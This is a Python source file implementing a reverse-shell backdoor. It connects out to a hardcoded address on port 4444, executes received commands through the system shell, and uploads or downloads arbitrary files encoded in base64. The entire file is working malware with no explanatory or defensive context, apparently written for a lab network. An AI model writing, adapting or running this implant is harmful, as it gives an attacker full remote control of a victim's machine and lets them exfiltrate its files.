import os
import socket
import json
import subprocess
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def execute_system_command(command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode(errors="ignore")
        except subprocess.CalledProcessError as e:
            return str(e)

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "Changing directory to " + path
        except FileNotFoundError:
            return "Directory not found: " + path
        except Exception as e:
            return str(e)

    def write_file(self, path, content):
        decoded_content = base64.b64decode(content)
        with open(path, "wb") as file:
            file.write(decoded_content)
        return "Uploaded"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                file_content = file.read()
            return base64.b64encode(file_content).decode()
        except Exception as e:
            return str(e)

    def run(self):
        try:
            while True:
                command = self.reliable_receive()
                command_name = command.get("command")
                if command_name == "exit":
                    self.connection.close()
                    exit()
                elif command_name == "cd":
                    command_result = self.change_working_directory_to(command.get("path"))
                elif command_name == "download":
                    command_result = self.read_file(command.get("path"))
                elif command_name == "upload":
                    command_result = self.write_file(command.get("path"), command.get("content"))
                else:
                    command_result = self.execute_system_command(command_name)
                self.reliable_send({"result": command_result})
        except Exception as e:
            self.reliable_send({"result": str(e)})
            self.connection.close()
            exit()

if __name__ == "__main__":
    my_backdoor = Backdoor("192.168.18.129", 4444)
    my_backdoor.run()
